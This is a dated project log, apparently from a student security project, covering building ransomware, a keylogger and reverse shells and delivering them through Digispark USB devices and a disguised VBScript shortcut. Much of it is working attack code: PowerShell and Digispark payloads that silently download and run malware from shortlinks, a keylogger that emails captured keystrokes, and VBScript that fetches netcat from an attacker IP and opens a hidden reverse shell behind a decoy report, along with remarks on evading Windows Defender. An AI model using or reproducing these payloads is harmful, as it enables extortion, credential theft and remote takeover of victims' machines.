### 19.9.2023:
 - Introduction to simple encrpytion and decryption scripts made with python 
 - Made [Simple scripts](https://github.com/therealhalonen/PhishSticks/tree/master/notes/rajala/Contents) with the help of NetworkChuck's video: https://www.youtube.com/watch?v=UtMMjXOlRQc

### 26.9.2023:

My goal for today is to combine the scripts made from previous week and put them together in a form of application. For now the GUI only needs one button and maybe few text boxes. 

After researching different options I chose to go with tkinter since there was an easy to follow guide in [GeeksForGeeks](https://www.geeksforgeeks.org/create-first-gui-application-using-python-tkinter/) on how to create a GUI application. GeeksForGeeks also had a [tkinter-cheat-sheet](https://www.geeksforgeeks.org/tkinter-cheat-sheet/) which was nice.

At first I combined and tidied up the scripts a little and made functions to the code so that the application calls for the function when its started or when a button is pressed. 

My vision was that the decrypt button only decrypts if correct password is given. 

I started making the application by adding the Decrypt button, password field and a greetings message. After few hours of learning and tweaking, the code of the app looks such:

```
#main window
root = tk.Tk()
root.title("RANSOMWARE DECRYPTOR")
root.geometry("600x500")
bg_color = root.cget("bg")

#message label
message_label = tk.Label(root, text="Unfortunately you've been hit by a ransomware :( this is only a demonstration so you don't have to pay anything to anybody. Password is lihapulla", wraplength=350, width=60, font=("Arial", 13))
message_label.pack(pady=30)

#password label
pw_label = tk.Label(root, text="Enter secret password to decrypt files", font=("Arial", 13))
pw_label.pack(pady=2)

#password text field
pw_entry = tk.Entry(root, width=15, font=("Arial", 17), show="*")
pw_entry.pack(pady=2)

#button to decrypt
decrypt_button = tk.Button(root, text="Decrypt Files", font=("Arial", 13))
decrypt_button.pack(pady=5)

root.mainloop()

```

 ![2023-09-26_20-48](https://github.com/therealhalonen/PhishSticks/assets/112076418/a4f2cae1-c12d-4948-833d-ab4819715eb3)

 To be continued..

Fast forward two hours later I continued to work and managed glue everything together with the help of ChatGPT. Assinging encrypt_files function to application startup and decrypt button with decrypt_files function was done and everything was working. I added some colors and information like what files have been encrypted, is the password correct and are there any files to decrypt.

For now the app looks like this:

![2023-09-26_21-03](https://github.com/therealhalonen/PhishSticks/assets/112076418/8fb9e882-b990-48cd-add6-309dd09af3be)

Full Python code and tests can be found [here](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware)

TO DO:
- convert working application to executable with [PyInstaller](https://datatofish.com/executable-pyinstaller/)?

### 4.10.2023:

Goal for today is to convert the working encrypt.py to encrypt.exe so it is possible to run anywhere without the need of python. I started off by reading [Finxters Python to EXE Linux: A Concise Guide to Conversion](https://blog.finxter.com/python-to-exe-linux-a-concise-guide-to-conversion/). 

"Keep in mind that while PyInstaller does an excellent job of generating executables on Linux systems, cross-compiling for Windows executables from a Linux environment is a more complex task."

After reading this I decided to go with the instruction on Windows environment since thats the environment this program is supposed to work in. So I hopped on to a Windows machine and downloaded the script and test files. I installed auto-to-py-exe that works with GUI. 
```
pip install auto-py-to-exe
auto-py-to-exe
```

![2023-10-04_17-57](https://github.com/therealhalonen/PhishSticks/assets/112076418/274f25fd-7630-4495-94ce-979c1137272c)


After giving the filepath and pressing the convert button, I ended up having Windows security stop the process, because it detected the file to be malicious, so I had to turn Real-time protection off for the time. After that I ended up having working encrypt.exe! Next thing I did was adding a custom icon to the file just for fun. 

![2023-10-04_19-25](https://github.com/therealhalonen/PhishSticks/assets/112076418/4c00b5d4-8ea5-46b8-9bbc-124bf8837e8f)

Right now its working on two Windows systems I have tested it in. But unfortunately not on Linux :(

TO DO:
- Setup digispark with [sawulohi's](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/notes.md#digispark) digispark tutorial - Done
- bypass windows defender/smart screen
- deploy the encrypt.exe with Digispark, something like [SaturnsVoid](https://github.com/SaturnsVoid/Digispark-Payload-Downloader) has done.

### 10.10.2023

I started up with modifying the previous application to only encrypt .txt and image files, just to be more safe when playing around.

First goal was to download and execute the file with powershell commands manually to see and test how it works before putting the commands inside Digispark.

Powershell command to manually download the exe to users Documents folder and start it after downloading has finished:
```Powershell
Invoke-WebRequest -OutFile "$env:UserProfile/Documents/malware.exe" -Uri "https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe";Start-Process $env:UserProfile/Documents/malware.exe -WorkingDir $env:UserProfile/Documents
```
The code outputs a file that can be run in a given directory that it specified after -WorkingDir

Next thing to do is to make Digispark execute the above command.

Setting Digispark to open run menu with Win + R and then opening up powershell and typing the command works! Quotes have to be escaped by using backslash \ for example  `\"https://example.com\"`

I also added `powershell.exe -windowstyle hidden` to run the downloading process in the background after the command is given. 
```
#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboardFi.print("powershell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1500);
DigiKeyboardFi.print("powershell.exe -windowstyle hidden Invoke-WebRequest -OutFile $env:UserProfile/Documents/malware.exe -Uri \"https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe\";Start-Process $env:UserProfile/Documents/malware.exe -WorkingDir $env:UserProfile/Documents");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
exit(0);
}

```
All this was pretty painless and straightforward, and for some reason it seems to bypass previous issues with Windows Defender and SmartScreen.

Demo can be found [here](https://www.youtube.com/watch?v=Bi2QOMSHeKI)

Instructions and files can be found [here](https://github.com/therealhalonen/PhishSticks/tree/master/digispark/digispark_ransomware)

TO DO:
- add more stealth ?

### 11.10.2023

[therealhalonen](https://github.com/therealhalonen) came up with an idea to run the commands straight from Run (Win + R) without having powershell open. Shortening our payload link to a shortlink and modifying the commands a bit, it managed to fit in the Run bar.

```
powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/36xacafn', \"$env:UserProfile/Documents/malware.exe\");Start-Process \"$env:UserProfile/Documents/malware.exe\" -WorkingDir \"$env:UserProfile/Documents\""
```

![2023-10-11_23-04](https://github.com/therealhalonen/PhishSticks/assets/112076418/02a7b00a-7a83-4f37-91ed-fdb08ef66cf6)

Pressing enter here executes the command and the download starts in the background. When its done, the program gets executed.

To make this work with Digispark, I had to add some backslashes before the backslashes so that DigiKeyboard wont escape them, since they are needed for the command to work. Working code looks like following:

```
#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/36xacafn', \\\"$env:UserProfile/Documents/malware.exe\\\");Start-Process \\\"$env:UserProfile/Documents/malware.exe\\\" -WorkingDir \\\"$env:UserProfile/Documents\\\"\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  exit(0);
}
```
One thing I noticed is that this method is much faster on getting the malware app to pop up than the previous code from yesterday, so this going to be the one that we're going to use for this project.

### 24.10.2023

Today we tried to work on our keylogger part of the project. sawulohi did some [testings](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/notes.md#keylogging-with-digispark) with Arduino and encountered some problems related to Windows Defender, so we had to find a different approach. First thing that came to my mind was to do the keylogger same way that I had done the [ransomware application](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware/ransom_app), which means converting a python script to an executable and running it through powershell commands. 

I found this already made python keylogger from [thepythoncode.com](https://thepythoncode.com/article/write-a-keylogger-python) made by Abdeladim Fadheli, which covered everything thats inside the code. I tested it quickly by running it and it works! After 60 seconds it creates a file from given keystrokes. [Full code](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_python/keylog.py)

![5FS1L9Q](https://github.com/therealhalonen/PhishSticks/assets/112076418/c266dc9f-b49c-4589-a33e-d8ce27c7fab3)

The python keylogger script offers an option to send given keystrokes to an email, so I made an email for our project and added it to our version of the script. Next thing I did was: convert .py file to .exe file and add some nice icon to it. I did this like I had previously done [here.](https://github.com/therealhalonen/PhishSticks/blob/master/notes/rajala/notes.md#4102023)

To test this, I uploaded the [keylog.exe](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_python/keylog.exe) and used basically the same command that I had used with the ransomware application:

I shortened the link so it fits in the Run bar and disguised the keylog.exe to Preferences.exe for fun:
```
powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/43y48zjx', \"$env:UserProfile/Preferences.exe\");Start-Process \"$env:UserProfile/Preferences.exe\" -WorkingDir \"$env:UserProfile\""
```
![2023-10-24_17-24](https://github.com/therealhalonen/PhishSticks/assets/112076418/7d6782be-f0bb-49a4-9368-893c36d703d0)

Executing the command downloads and runs the keylogger in the background. Every minute it sends all the keystrokes it catched to our email. 

View from task manager looks like this: 

![kuva](https://github.com/therealhalonen/PhishSticks/assets/112076418/a76e1178-7ab0-452b-b8d0-f5283addbf5a)

After a minute of typing random stuff in my notepad I get an email:

![2023-10-24_17-28](https://github.com/therealhalonen/PhishSticks/assets/112076418/6db9dbee-44e9-4d33-bb9a-328edc8277ed)

Works! And this method also seems to pass Windows Defender for some reason. 

[therealhalonen](https://github.com/therealhalonen/PhishSticks/blob/master/notes/halonen/notes.md#24102023) had different approach than me, but he also bypassed Windows Defender with his [powershell script](https://github.com/therealhalonen/PhishSticks/blob/master/notes/halonen/notes_res/helper.ps1). 

TO DO:
- Apply and test this with DigiSpark
- DEMO

### 25.10.2023

Setting up Digispark with exactly same code as before with the ransomware app, but changing the download file link to the keylogger.exe works

```
#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/43y48zjx', \\\"$env:UserProfile/Preferences.exe\\\");Start-Process \\\"$env:UserProfile/Preferences.exe\\\" -WorkingDir \\\"$env:UserProfile/\\\"\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  exit(0);
}
```
[PROOF](https://www.youtube.com/watch?v=sWYUGl7JiFA)

### 21.11.2023

Back to the reverse shell. After playing with Digispark for so long, I decided to play with the USB reverse shell stuff.

Trying to add some stealth to our [previous](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/revshell_demo) reverse shell script, I first tried some powershell variations of the code, but the terminal window still kept flashing briefly on the screen, which I wasnt happy about. Moving on!

I stumbled across this discussion on [StackOverflow](https://stackoverflow.com/questions/13142603/prevent-vbscript-app-from-showing-console-window) about running cmd commands silently. With VBScript it is possible to execute multiple commands, so I had an idea to include a fake report.txt file to be downloadead along with netcat while opening up the company report file.

With lots of tinkering and testing with the code, I managed to make it do just what I wanted: Download the fake raport.txt & netcat from my Kali machine and execute the reverse shell in all silence in the Windows machine.

This is what I put in the revsh.vbs file:

```vbs
Set objShell = CreateObject("Wscript.Shell")

' Download fake report
downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/raport.txt', '%TEMP%\raport.txt')"""
objShell.Run downloadRaport, 0, True

' Open report.txt
objShell.Run "cmd /c start """" %TEMP%\raport.txt", 0, True

' Download netcat from attacker IP
downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/nc64.exe', '%TEMP%\nc64.exe')"""
objShell.Run downloadCmd, 0, True

' Start reverse shell
execCmd = "cmd /c powershell -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '192.168.56.3', '9001', '-e', 'powershell' -WindowStyle Hidden"""
objShell.Run execCmd, 0, True

Set objShell = Nothing
```
Next thing I did was adding a shortcut to the script that I had put in a hidden folder called payload.

![2023-11-22_02-58](https://github.com/therealhalonen/PhishSticks/assets/112076418/095a2b9d-1401-43ad-bd93-e37d42bdd8ed)

After that I chose a new icon for the shortcut and I unticked the box to show hidden items. On most systems this is off by default, which is why this attack has a high chance to work, since the victim wont see the payload folder.

![2023-11-21_21-39](https://github.com/therealhalonen/PhishSticks/assets/112076418/07159048-d3c1-496f-a052-63e84d8a5b8e)

Next thing to do is to set up my Kali machine with netcat listener and python server for file hosting. Inside ~/Attacker/payloads folder I had nc64.exe and raport.txt ready to be downloaded.

![2023-11-22_03-13](https://github.com/therealhalonen/PhishSticks/assets/112076418/f331c4b0-5def-488b-8cdf-f0bec94cfe23)

After double clicking the Company raport shortcut, magic starts to happen:

Files get downloaded from the Kali machine and reverse shell is done!

![2023-11-22_03-20](https://github.com/therealhalonen/PhishSticks/assets/112076418/17bb785d-7196-4e76-a57d-e0d0c5923525)

And in exchange for the reverse shell, the Windows machine (victim) gets this beautiful report from Big Company:

![2023-11-22_03-22](https://github.com/therealhalonen/PhishSticks/assets/112076418/2afa5007-0508-42ac-a1e8-cfef6e909ee8)

Pretty stealth! And it bypasses Windows Defender!!

Video of it in action: https://www.youtube.com/watch?v=ll4ojo6q-rM

### 22.11.2023

After testing alot, we loved the stealth this kind of attack gives, so we tried to apply this kind of USB attack with our other payloads such as [keylogger](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/keylogger) and [ransomware](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware)

Just modify the .vbs file with the payload you want and enjoy your USB attacks! (remember to host the downloadable payloads in your attacker machines folder! (or replace the attacker IP with the source of the malware like for example https://tinyurl.com/36xacafn is the source of the ransomware from our GitHub while https://tinyurl.com/3va6t8n7 is the raport.txt)


Script that downloads the ransomware + raport.txt and executes it in the Documents folder.
```
Set objShell = CreateObject("Wscript.Shell")

' Download fake raport
downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/3va6t8n7', '%TEMP%\BIGraport.txt')"""
objShell.Run downloadRaport, 0, True

' Open raport.txt
openRaport = "cmd /c start """" %TEMP%\BIGraport.txt"
objShell.Run openRaport, 0, True

' Download the executable from attacker ip or other source
downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/36xacafn', '%TEMP%\encrypt.exe')"""
objShell.Run downloadCmd, 0, True

' Start the exe in working directory defined below
execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\encrypt.exe\"" -WorkingDirectory \""$env:UserProfile\Documents\"""""
objShell.Run execCmd, 0, True

Set objShell = Nothing
```


